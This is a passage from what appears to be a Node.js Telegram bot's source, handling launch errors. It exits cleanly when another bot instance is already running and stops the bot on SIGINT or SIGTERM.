  if (msg.includes("409") || msg.includes("Conflict") || msg.includes("terminated by other")) {
    console.warn("⚠️  Another Telegram bot instance is already running (production deployment).");
    console.warn("    This dev instance will exit — the production bot is handling requests.");
    process.exit(0); // Clean exit — not a failure
  }
  console.error("Bot launch error:", err);
  process.exit(1);
});

process.once("SIGINT",  () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
